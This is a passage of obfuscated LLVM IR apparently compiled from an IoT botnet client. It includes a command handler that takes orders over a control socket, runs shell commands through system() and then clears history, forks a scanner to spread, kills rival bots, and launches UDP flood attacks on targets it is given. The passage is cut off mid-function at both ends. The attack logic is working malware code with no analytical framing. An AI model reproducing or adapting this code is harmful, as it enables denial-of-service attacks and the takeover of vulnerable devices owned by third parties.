  %167 = load i32, i32* %8, align 4
  %168 = sub i32 0, %167
  %169 = sub i32 0, 1
  %170 = add i32 %168, %169
  %171 = sub i32 0, %170
  %172 = add nsw i32 %167, 1
  store i32 %171, i32* %8, align 4
  br label %129

; <label>:173:                                    ; preds = %129
  br label %114

; <label>:174:                                    ; preds = %120
  br label %175

; <label>:175:                                    ; preds = %174, %164
  br label %176

; <label>:176:                                    ; preds = %209, %175
  %177 = load i32, i32* %6, align 4
  %178 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %179 = call i64 @recv(i32 %177, i8* %178, i64 4096, i32 0)
  %180 = trunc i64 %179 to i32
  store i32 %180, i32* %17, align 4
  %181 = icmp sle i32 %180, 0
  br i1 %181, label %182, label %183

; <label>:182:                                    ; preds = %176
  br label %210

; <label>:183:                                    ; preds = %176
  %184 = load i32, i32* %17, align 4
  %185 = icmp slt i32 %184, 4096
  br i1 %185, label %186, label %190

; <label>:186:                                    ; preds = %183
  %187 = load i32, i32* %17, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %188
  store i8 0, i8* %189, align 1
  br label %190

; <label>:190:                                    ; preds = %186, %183
  store i32 0, i32* %18, align 4
  br label %191

; <label>:191:                                    ; preds = %203, %190
  %192 = load i32, i32* %18, align 4
  %193 = load i32, i32* %17, align 4
  %194 = icmp slt i32 %192, %193
  br i1 %194, label %195, label %209

; <label>:195:                                    ; preds = %191
  %196 = load i32, i32* %18, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %197
  %199 = load i8, i8* %198, align 1
  %200 = sext i8 %199 to i32
  %201 = load %struct._IO_FILE*, %struct._IO_FILE** %12, align 8
  %202 = call i32 @fputc(i32 %200, %struct._IO_FILE* %201)
  br label %203

; <label>:203:                                    ; preds = %195
  %204 = load i32, i32* %18, align 4
  %205 = add i32 %204, 1511797251
  %206 = add i32 %205, 1
  %207 = sub i32 %206, 1511797251
  %208 = add nsw i32 %204, 1
  store i32 %207, i32* %18, align 4
  br label %191

; <label>:209:                                    ; preds = %191
  br label %176

; <label>:210:                                    ; preds = %182
  %211 = load %struct._IO_FILE*, %struct._IO_FILE** %12, align 8
  %212 = call i32 @fclose(%struct._IO_FILE* %211)
  %213 = load i32, i32* %6, align 4
  %214 = call i32 @close(i32 %213)
  store i32 0, i32* %3, align 4
  br label %215

; <label>:215:                                    ; preds = %210, %102, %74, %21
  %216 = load i32, i32* %3, align 4
  ret i32 %216
}

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8*, i8*, i64) #1

declare %struct.hostent* @gethostbyname(i8*) #3

declare i32 @fputc(i32, %struct._IO_FILE*) #3

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i8*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i32, align 4
  %45 = alloca i8*, align 8
  %46 = alloca i32, align 4
  %47 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %48 = load i8**, i8*** %4, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 0
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @strcmp(i8* %50, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.431, i32 0, i32 0)) #10
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %94, label %53

; <label>:53:                                     ; preds = %2
  %54 = load i8**, i8*** %4, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 1
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 @strcmp(i8* %56, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.432, i32 0, i32 0)) #10
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %63, label %59

; <label>:59:                                     ; preds = %53
  %60 = call i32 @system(i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.433, i32 0, i32 0))
  call void @ClearHistory()
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 %61, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.434, i32 0, i32 0))
  br label %63

; <label>:63:                                     ; preds = %59, %53
  %64 = load i8**, i8*** %4, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 1
  %66 = load i8*, i8** %65, align 8
  %67 = call i32 @strcmp(i8* %66, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.435, i32 0, i32 0)) #10
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %73, label %69

; <label>:69:                                     ; preds = %63
  %70 = call i32 @system(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.436, i32 0, i32 0))
  call void @ClearHistory()
  %71 = load i32, i32* @mainCommSock, align 4
  %72 = call i32 (i32, i8*, ...) @sockprintf(i32 %71, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.437, i32 0, i32 0))
  br label %73

; <label>:73:                                     ; preds = %69, %63
  %74 = load i8**, i8*** %4, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 1
  %76 = load i8*, i8** %75, align 8
  %77 = call i32 @strcmp(i8* %76, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.438, i32 0, i32 0)) #10
  %78 = icmp ne i32 %77, 0
  br i1 %78, label %83, label %79

; <label>:79:                                     ; preds = %73
  %80 = call i32 @system(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.439, i32 0, i32 0))
  call void @ClearHistory()
  %81 = load i32, i32* @mainCommSock, align 4
  %82 = call i32 (i32, i8*, ...) @sockprintf(i32 %81, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.440, i32 0, i32 0))
  br label %83

; <label>:83:                                     ; preds = %79, %73
  %84 = load i8**, i8*** %4, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 1
  %86 = load i8*, i8** %85, align 8
  %87 = call i32 @strcmp(i8* %86, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.441, i32 0, i32 0)) #10
  %88 = icmp ne i32 %87, 0
  br i1 %88, label %93, label %89

; <label>:89:                                     ; preds = %83
  %90 = call i32 @system(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.442, i32 0, i32 0))
  call void @ClearHistory()
  %91 = load i32, i32* @mainCommSock, align 4
  %92 = call i32 (i32, i8*, ...) @sockprintf(i32 %91, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.443, i32 0, i32 0))
  br label %93

; <label>:93:                                     ; preds = %89, %83
  br label %94

; <label>:94:                                     ; preds = %93, %2
  %95 = load i8**, i8*** %4, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 0
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 @strcmp(i8* %97, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i32 0, i32 0)) #10
  %99 = icmp ne i32 %98, 0
  br i1 %99, label %103, label %100

; <label>:100:                                    ; preds = %94
  %101 = load i32, i32* @mainCommSock, align 4
  %102 = call i32 (i32, i8*, ...) @sockprintf(i32 %101, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.444, i32 0, i32 0))
  br label %933

; <label>:103:                                    ; preds = %94
  %104 = load i8**, i8*** %4, align 8
  %105 = getelementptr inbounds i8*, i8** %104, i64 0
  %106 = load i8*, i8** %105, align 8
  %107 = call i32 @strcmp(i8* %106, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.445, i32 0, i32 0)) #10
  %108 = icmp ne i32 %107, 0
  br i1 %108, label %113, label %109

; <label>:109:                                    ; preds = %103
  %110 = load i32, i32* @mainCommSock, align 4
  %111 = call i32 @getdtablesize() #2
  %112 = call i32 (i32, i8*, ...) @sockprintf(i32 %110, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.323, i32 0, i32 0), i32 %111)
  br label %933

; <label>:113:                                    ; preds = %103
  %114 = load i8**, i8*** %4, align 8
  %115 = getelementptr inbounds i8*, i8** %114, i64 0
  %116 = load i8*, i8** %115, align 8
  %117 = call i32 @strcmp(i8* %116, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.435, i32 0, i32 0)) #10
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %122, label %119

; <label>:119:                                    ; preds = %113
  %120 = load i32, i32* @mainCommSock, align 4
  %121 = call i32 (i32, i8*, ...) @sockprintf(i32 %120, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.446, i32 0, i32 0))
  call void (i32, ...) bitcast (void ()* @binsBins to void (i32, ...)*)(i32 1)
  br label %933

; <label>:122:                                    ; preds = %113
  %123 = load i8**, i8*** %4, align 8
  %124 = getelementptr inbounds i8*, i8** %123, i64 0
  %125 = load i8*, i8** %124, align 8
  %126 = call i32 @strcmp(i8* %125, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.447, i32 0, i32 0)) #10
  %127 = icmp ne i32 %126, 0
  br i1 %127, label %188, label %128

; <label>:128:                                    ; preds = %122
  %129 = load i8**, i8*** %4, align 8
  %130 = getelementptr inbounds i8*, i8** %129, i64 1
  %131 = load i8*, i8** %130, align 8
  %132 = call i32 @strcmp(i8* %131, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.438, i32 0, i32 0)) #10
  %133 = icmp ne i32 %132, 0
  br i1 %133, label %143, label %134

; <label>:134:                                    ; preds = %128
  %135 = load i32, i32* @scanPid, align 4
  %136 = icmp eq i32 %135, 0
  br i1 %136, label %137, label %138

; <label>:137:                                    ; preds = %134
  br label %933

; <label>:138:                                    ; preds = %134
  %139 = load i32, i32* @scanPid, align 4
  %140 = call i32 @kill(i32 %139, i32 9) #2
  %141 = load i32, i32* @mainCommSock, align 4
  %142 = call i32 (i32, i8*, ...) @sockprintf(i32 %141, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.448, i32 0, i32 0))
  store i32 0, i32* @scanPid, align 4
  br label %143

; <label>:143:                                    ; preds = %138, %128
  %144 = load i8**, i8*** %4, align 8
  %145 = getelementptr inbounds i8*, i8** %144, i64 1
  %146 = load i8*, i8** %145, align 8
  %147 = call i32 @strcmp(i8* %146, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.449, i32 0, i32 0)) #10
  %148 = icmp ne i32 %147, 0
  br i1 %148, label %187, label %149

; <label>:149:                                    ; preds = %143
  %150 = load i32, i32* @scanPid, align 4
  %151 = icmp ne i32 %150, 0
  br i1 %151, label %152, label %153

; <label>:152:                                    ; preds = %149
  br label %933

; <label>:153:                                    ; preds = %149
  %154 = call i32 @fork() #2
  store i32 %154, i32* %5, align 4
  store i32 8192, i32* %7, align 4
  %155 = call i64 @sysconf(i32 84) #2
  %156 = mul nsw i64 %155, 64
  %157 = trunc i64 %156 to i32
  store i32 %157, i32* %8, align 4
  store i32 10, i32* %9, align 4
  %158 = load i32, i32* %5, align 4
  %159 = icmp sgt i32 %158, 0
  br i1 %159, label %160, label %162

; <label>:160:                                    ; preds = %153
  %161 = load i32, i32* %5, align 4
  store i32 %161, i32* @scanPid, align 4
  br label %933

; <label>:162:                                    ; preds = %153
  %163 = load i32, i32* %5, align 4
  %164 = icmp eq i32 %163, -1
  br i1 %164, label %165, label %166

; <label>:165:                                    ; preds = %162
  br label %933

; <label>:166:                                    ; preds = %162
  br label %167

; <label>:167:                                    ; preds = %166
  %168 = load i32, i32* @mainCommSock, align 4
  %169 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %170 = call i8* @inet_ntoa(i32 %169) #2
  %171 = call i32 (i32, i8*, ...) @sockprintf(i32 %168, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.450, i32 0, i32 0), i8* %170)
  store i32 0, i32* %6, align 4
  br label %172

; <label>:172:                                    ; preds = %179, %167
  %173 = load i32, i32* %6, align 4
  %174 = load i32, i32* %8, align 4
  %175 = icmp slt i32 %173, %174
  br i1 %175, label %176, label %186

; <label>:176:                                    ; preds = %172
  %177 = load i32, i32* %9, align 4
  %178 = load i32, i32* %7, align 4
  call void @StartTheLelz(i32 %177, i32 %178)
  br label %179

; <label>:179:                                    ; preds = %176
  %180 = load i32, i32* %6, align 4
  %181 = sub i32 0, %180
  %182 = sub i32 0, 1
  %183 = add i32 %181, %182
  %184 = sub i32 0, %183
  %185 = add nsw i32 %180, 1
  store i32 %184, i32* %6, align 4
  br label %172

; <label>:186:                                    ; preds = %172
  call void @_exit(i32 0) #12
  unreachable

; <label>:187:                                    ; preds = %143
  br label %188

; <label>:188:                                    ; preds = %187, %122
  %189 = load i8**, i8*** %4, align 8
  %190 = getelementptr inbounds i8*, i8** %189, i64 0
  %191 = load i8*, i8** %190, align 8
  %192 = call i32 @strcmp(i8* %191, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.451, i32 0, i32 0)) #10
  %193 = icmp ne i32 %192, 0
  br i1 %193, label %203, label %194

; <label>:194:                                    ; preds = %188
  %195 = call i32 @listFork()
  %196 = icmp ne i32 %195, 0
  br i1 %196, label %202, label %197

; <label>:197:                                    ; preds = %194
  %198 = load i32, i32* @mainCommSock, align 4
  %199 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %200 = call i8* @inet_ntoa(i32 %199) #2
  %201 = call i32 (i32, i8*, ...) @sockprintf(i32 %198, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.452, i32 0, i32 0), i8* %200)
  call void @botkiller()
  call void @_exit(i32 0) #12
  unreachable

; <label>:202:                                    ; preds = %194
  br label %203

; <label>:203:                                    ; preds = %202, %188
  %204 = load i8**, i8*** %4, align 8
  %205 = getelementptr inbounds i8*, i8** %204, i64 0
  %206 = load i8*, i8** %205, align 8
  %207 = call i32 @strcmp(i8* %206, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.453, i32 0, i32 0)) #10
  %208 = icmp ne i32 %207, 0
  br i1 %208, label %214, label %209

; <label>:209:                                    ; preds = %203
  %210 = load i32, i32* @mainCommSock, align 4
  %211 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %212 = call i8* @inet_ntoa(i32 %211) #2
  %213 = call i32 (i32, i8*, ...) @sockprintf(i32 %210, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.454, i32 0, i32 0), i8* %212)
  br label %933

; <label>:214:                                    ; preds = %203
  %215 = load i8**, i8*** %4, align 8
  %216 = getelementptr inbounds i8*, i8** %215, i64 0
  %217 = load i8*, i8** %216, align 8
  %218 = call i32 @strcmp(i8* %217, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.455, i32 0, i32 0)) #10
  %219 = icmp ne i32 %218, 0
  br i1 %219, label %365, label %220

; <label>:220:                                    ; preds = %214
  %221 = load i32, i32* %3, align 4
  %222 = icmp slt i32 %221, 6
  br i1 %222, label %274, label %223

; <label>:223:                                    ; preds = %220
  %224 = load i8**, i8*** %4, align 8
  %225 = getelementptr inbounds i8*, i8** %224, i64 3
  %226 = load i8*, i8** %225, align 8
  %227 = call i32 @atoi(i8* %226) #10
  %228 = icmp eq i32 %227, -1
  br i1 %228, label %274, label %229

; <label>:229:                                    ; preds = %223
  %230 = load i8**, i8*** %4, align 8
  %231 = getelementptr inbounds i8*, i8** %230, i64 2
  %232 = load i8*, i8** %231, align 8
  %233 = call i32 @atoi(i8* %232) #10
  %234 = icmp eq i32 %233, -1
  br i1 %234, label %274, label %235

; <label>:235:                                    ; preds = %229
  %236 = load i8**, i8*** %4, align 8
  %237 = getelementptr inbounds i8*, i8** %236, i64 4
  %238 = load i8*, i8** %237, align 8
  %239 = call i32 @atoi(i8* %238) #10
  %240 = icmp eq i32 %239, -1
  br i1 %240, label %274, label %241

; <label>:241:                                    ; preds = %235
  %242 = load i8**, i8*** %4, align 8
  %243 = getelementptr inbounds i8*, i8** %242, i64 5
  %244 = load i8*, i8** %243, align 8
  %245 = call i32 @atoi(i8* %244) #10
  %246 = icmp eq i32 %245, -1
  br i1 %246, label %274, label %247

; <label>:247:                                    ; preds = %241
  %248 = load i8**, i8*** %4, align 8
  %249 = getelementptr inbounds i8*, i8** %248, i64 5
  %250 = load i8*, i8** %249, align 8
  %251 = call i32 @atoi(i8* %250) #10
  %252 = icmp sgt i32 %251, 65536
  br i1 %252, label %274, label %253

; <label>:253:                                    ; preds = %247
  %254 = load i8**, i8*** %4, align 8
  %255 = getelementptr inbounds i8*, i8** %254, i64 5
  %256 = load i8*, i8** %255, align 8
  %257 = call i32 @atoi(i8* %256) #10
  %258 = icmp sgt i32 %257, 65500
  br i1 %258, label %274, label %259

; <label>:259:                                    ; preds = %253
  %260 = load i8**, i8*** %4, align 8
  %261 = getelementptr inbounds i8*, i8** %260, i64 4
  %262 = load i8*, i8** %261, align 8
  %263 = call i32 @atoi(i8* %262) #10
  %264 = icmp sgt i32 %263, 32
  br i1 %264, label %274, label %265

; <label>:265:                                    ; preds = %259
  %266 = load i32, i32* %3, align 4
  %267 = icmp eq i32 %266, 7
  br i1 %267, label %268, label %277

; <label>:268:                                    ; preds = %265
  %269 = load i8**, i8*** %4, align 8
  %270 = getelementptr inbounds i8*, i8** %269, i64 6
  %271 = load i8*, i8** %270, align 8
  %272 = call i32 @atoi(i8* %271) #10
  %273 = icmp slt i32 %272, 1
  br i1 %273, label %274, label %277

; <label>:274:                                    ; preds = %268, %259, %253, %247, %241, %235, %229, %223, %220
  %275 = load i32, i32* @mainCommSock, align 4
  %276 = call i32 (i32, i8*, ...) @sockprintf(i32 %275, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.456, i32 0, i32 0))
  br label %933

; <label>:277:                                    ; preds = %268, %265
  %278 = load i8**, i8*** %4, align 8
  %279 = getelementptr inbounds i8*, i8** %278, i64 1
  %280 = load i8*, i8** %279, align 8
  store i8* %280, i8** %10, align 8
  %281 = load i8**, i8*** %4, align 8
  %282 = getelementptr inbounds i8*, i8** %281, i64 2
  %283 = load i8*, i8** %282, align 8
  %284 = call i32 @atoi(i8* %283) #10
  store i32 %284, i32* %11, align 4
  %285 = load i8**, i8*** %4, align 8
  %286 = getelementptr inbounds i8*, i8** %285, i64 3
  %287 = load i8*, i8** %286, align 8
  %288 = call i32 @atoi(i8* %287) #10
  store i32 %288, i32* %12, align 4
  %289 = load i8**, i8*** %4, align 8
  %290 = getelementptr inbounds i8*, i8** %289, i64 4
  %291 = load i8*, i8** %290, align 8
  %292 = call i32 @atoi(i8* %291) #10
  store i32 %292, i32* %13, align 4
  %293 = load i8**, i8*** %4, align 8
  %294 = getelementptr inbounds i8*, i8** %293, i64 5
  %295 = load i8*, i8** %294, align 8
  %296 = call i32 @atoi(i8* %295) #10
  store i32 %296, i32* %14, align 4
  %297 = load i32, i32* %3, align 4
  %298 = icmp sgt i32 %297, 6
  br i1 %298, label %299, label %304

; <label>:299:                                    ; preds = %277
  %300 = load i8**, i8*** %4, align 8
  %301 = getelementptr inbounds i8*, i8** %300, i64 6
  %302 = load i8*, i8** %301, align 8
  %303 = call i32 @atoi(i8* %302) #10
  br label %305

; <label>:304:                                    ; preds = %277
  br label %305

; <label>:305:                                    ; preds = %304, %299
  %306 = phi i32 [ %303, %299 ], [ 1000, %304 ]
  store i32 %306, i32* %15, align 4
  %307 = load i32, i32* %3, align 4
  %308 = icmp sgt i32 %307, 7
  br i1 %308, label %309, label %314

; <label>:309:                                    ; preds = %305
  %310 = load i8**, i8*** %4, align 8
  %311 = getelementptr inbounds i8*, i8** %310, i64 7
  %312 = load i8*, i8** %311, align 8
  %313 = call i32 @atoi(i8* %312) #10
  br label %315

; <label>:314:                                    ; preds = %305
  br label %315

; <label>:315:                                    ; preds = %314, %309
  %316 = phi i32 [ %313, %309 ], [ 1000000, %314 ]
  store i32 %316, i32* %16, align 4
  %317 = load i32, i32* %3, align 4
  %318 = icmp sgt i32 %317, 8
  br i1 %318, label %319, label %324

; <label>:319:                                    ; preds = %315
  %320 = load i8**, i8*** %4, align 8
  %321 = getelementptr inbounds i8*, i8** %320, i64 8
  %322 = load i8*, i8** %321, align 8
  %323 = call i32 @atoi(i8* %322) #10
  br label %325

; <label>:324:                                    ; preds = %315
  br label %325

; <label>:325:                                    ; preds = %324, %319
  %326 = phi i32 [ %323, %319 ], [ 0, %324 ]
  store i32 %326, i32* %17, align 4
  %327 = load i8*, i8** %10, align 8
  %328 = call i8* @strstr(i8* %327, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %329 = icmp ne i8* %328, null
  br i1 %329, label %330, label %351

; <label>:330:                                    ; preds = %325
  %331 = load i8*, i8** %10, align 8
  %332 = call i8* @strtok(i8* %331, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %332, i8** %18, align 8
  br label %333

; <label>:333:                                    ; preds = %348, %330
  %334 = load i8*, i8** %18, align 8
  %335 = icmp ne i8* %334, null
  br i1 %335, label %336, label %350

; <label>:336:                                    ; preds = %333
  %337 = call i32 @listFork()
  %338 = icmp ne i32 %337, 0
  br i1 %338, label %348, label %339

; <label>:339:                                    ; preds = %336
  %340 = load i8*, i8** %18, align 8
  %341 = load i32, i32* %11, align 4
  %342 = load i32, i32* %12, align 4
  %343 = load i32, i32* %13, align 4
  %344 = load i32, i32* %14, align 4
  %345 = load i32, i32* %15, align 4
  %346 = load i32, i32* %16, align 4
  %347 = load i32, i32* %17, align 4
  call void @sendUDP(i8* %340, i32 %341, i32 %342, i32 %343, i32 %344, i32 %345, i32 %346, i32 %347)
  call void @_exit(i32 0) #12
  unreachable

; <label>:348:                                    ; preds = %336
  %349 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %349, i8** %18, align 8
  br label %333

; <label>:350:                                    ; preds = %333
  br label %364

; <label>:351:                                    ; preds = %325
  %352 = call i32 @listFork()
  %353 = icmp ne i32 %352, 0
  br i1 %353, label %363, label %354

; <label>:354:                                    ; preds = %351
  %355 = load i8*, i8** %10, align 8
  %356 = load i32, i32* %11, align 4
  %357 = load i32, i32* %12, align 4
  %358 = load i32, i32* %13, align 4
  %359 = load i32, i32* %14, align 4
  %360 = load i32, i32* %15, align 4
  %361 = load i32, i32* %16, align 4
  %362 = load i32, i32* %17, align 4
  call void @sendUDP(i8* %355, i32 %356, i32 %357, i32 %358, i32 %359, i32 %360, i32 %361, i32 %362)
  call void @_exit(i32 0) #12
  unreachable

; <label>:363:                                    ; preds = %351
  br label %364

; <label>:364:                                    ; preds = %363, %350
  br label %933

; <label>:365:                                    ; preds = %214
  %366 = load i8**, i8*** %4, align 8
  %367 = getelementptr inbounds i8*, i8** %366, i64 0
  %368 = load i8*, i8** %367, align 8
  %369 = call i32 @strcmp(i8* %368, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.457, i32 0, i32 0)) #10
  %370 = icmp ne i32 %369, 0
  br i1 %370, label %494, label %371

; <label>:371:                                    ; preds = %365
  %372 = load i32, i32* %3, align 4
  %373 = icmp slt i32 %372, 6
  br i1 %373, label %416, label %374

; <label>:374:                                    ; preds = %371
  %375 = load i8**, i8*** %4, align 8
  %376 = getelementptr inbounds i8*, i8** %375, i64 3
  %377 = load i8*, i8** %376, align 8
  %378 = call i32 @atoi(i8* %377) #10
  %379 = icmp eq i32 %378, -1
  br i1 %379, label %416, label %380

; <label>:380:                                    ; preds = %374
  %381 = load i8**, i8*** %4, align 8
  %382 = getelementptr inbounds i8*, i8** %381, i64 2
  %383 = load i8*, i8** %382, align 8
  %384 = call i32 @atoi(i8* %383) #10
  %385 = icmp eq i32 %384, -1
  br i1 %385, label %416, label %386

; <label>:386:                                    ; preds = %380
  %387 = load i8**, i8*** %4, align 8
  %388 = getelementptr inbounds i8*, i8** %387, i64 4
  %389 = load i8*, i8** %388, align 8
  %390 = call i32 @atoi(i8* %389) #10
  %391 = icmp eq i32 %390, -1
  br i1 %391, label %416, label %392

; <label>:392:                                    ; preds = %386
  %393 = load i8**, i8*** %4, align 8
  %394 = getelementptr inbounds i8*, i8** %393, i64 4
  %395 = load i8*, i8** %394, align 8
  %396 = call i32 @atoi(i8* %395) #10
  %397 = icmp sgt i32 %396, 32
  br i1 %397, label %416, label %398

; <label>:398:                                    ; preds = %392
  %399 = load i32, i32* %3, align 4
  %400 = icmp sgt i32 %399, 6
  br i1 %400, label %401, label %407

; <label>:401:                                    ; preds = %398
  %402 = load i8**, i8*** %4, align 8
  %403 = getelementptr inbounds i8*, i8** %402, i64 6
  %404 = load i8*, i8** %403, align 8
  %405 = call i32 @atoi(i8* %404) #10
  %406 = icmp slt i32 %405, 0
  br i1 %406, label %416, label %407

; <label>:407:                                    ; preds = %401, %398
  %408 = load i32, i32* %3, align 4
  %409 = icmp eq i32 %408, 8
  br i1 %409, label %410, label %419

; <label>:410:                                    ; preds = %407
  %411 = load i8**, i8*** %4, align 8
  %412 = getelementptr inbounds i8*, i8** %411, i64 7
  %413 = load i8*, i8** %412, align 8
  %414 = call i32 @atoi(i8* %413) #10
  %415 = icmp slt i32 %414, 1
  br i1 %415, label %416, label %419

; <label>:416:                                    ; preds = %410, %401, %392, %386, %380, %374, %371
  %417 = load i32, i32* @mainCommSock, align 4
  %418 = call i32 (i32, i8*, ...) @sockprintf(i32 %417, i8* getelementptr inbounds ([186 x i8], [186 x i8]* @.str.458, i32 0, i32 0))
  br label %933

; <label>:419:                                    ; preds = %410, %407
  %420 = load i8**, i8*** %4, align 8
  %421 = getelementptr inbounds i8*, i8** %420, i64 1
  %422 = load i8*, i8** %421, align 8
  store i8* %422, i8** %19, align 8
  %423 = load i8**, i8*** %4, align 8
  %424 = getelementptr inbounds i8*, i8** %423, i64 2
  %425 = load i8*, i8** %424, align 8
  %426 = call i32 @atoi(i8* %425) #10
  store i32 %426, i32* %20, align 4
  %427 = load i8**, i8*** %4, align 8
  %428 = getelementptr inbounds i8*, i8** %427, i64 3
  %429 = load i8*, i8** %428, align 8
  %430 = call i32 @atoi(i8* %429) #10
  store i32 %430, i32* %21, align 4
  %431 = load i8**, i8*** %4, align 8
  %432 = getelementptr inbounds i8*, i8** %431, i64 4
  %433 = load i8*, i8** %432, align 8
  %434 = call i32 @atoi(i8* %433) #10
  store i32 %434, i32* %22, align 4
  %435 = load i8**, i8*** %4, align 8
  %436 = getelementptr inbounds i8*, i8** %435, i64 5
  %437 = load i8*, i8** %436, align 8
  store i8* %437, i8** %23, align 8
  %438 = load i32, i32* %3, align 4
  %439 = icmp eq i32 %438, 8
  br i1 %439, label %440, label %445

; <label>:440:                                    ; preds = %419
  %441 = load i8**, i8*** %4, align 8
  %442 = getelementptr inbounds i8*, i8** %441, i64 7
  %443 = load i8*, i8** %442, align 8
  %444 = call i32 @atoi(i8* %443) #10
  br label %446

; <label>:445:                                    ; preds = %419
  br label %446

; <label>:446:                                    ; preds = %445, %440
  %447 = phi i32 [ %444, %440 ], [ 10, %445 ]
  store i32 %447, i32* %24, align 4
  %448 = load i32, i32* %3, align 4
  %449 = icmp sgt i32 %448, 6
  br i1 %449, label %450, label %455

; <label>:450:                                    ; preds = %446
  %451 = load i8**, i8*** %4, align 8
  %452 = getelementptr inbounds i8*, i8** %451, i64 6
  %453 = load i8*, i8** %452, align 8
  %454 = call i32 @atoi(i8* %453) #10
  br label %456

; <label>:455:                                    ; preds = %446
  br label %456

; <label>:456:                                    ; preds = %455, %450
  %457 = phi i32 [ %454, %450 ], [ 0, %455 ]
  store i32 %457, i32* %25, align 4
  %458 = load i8*, i8** %19, align 8
  %459 = call i8* @strstr(i8* %458, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %460 = icmp ne i8* %459, null
  br i1 %460, label %461, label %481

; <label>:461:                                    ; preds = %456
  %462 = load i8*, i8** %19, align 8
  %463 = call i8* @strtok(i8* %462, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %463, i8** %26, align 8
  br label %464

; <label>:464:                                    ; preds = %478, %461
  %465 = load i8*, i8** %26, align 8
  %466 = icmp ne i8* %465, null
  br i1 %466, label %467, label %480

; <label>:467:                                    ; preds = %464
  %468 = call i32 @listFork()
  %469 = icmp ne i32 %468, 0
  br i1 %469, label %478, label %470

; <label>:470:                                    ; preds = %467
  %471 = load i8*, i8** %26, align 8
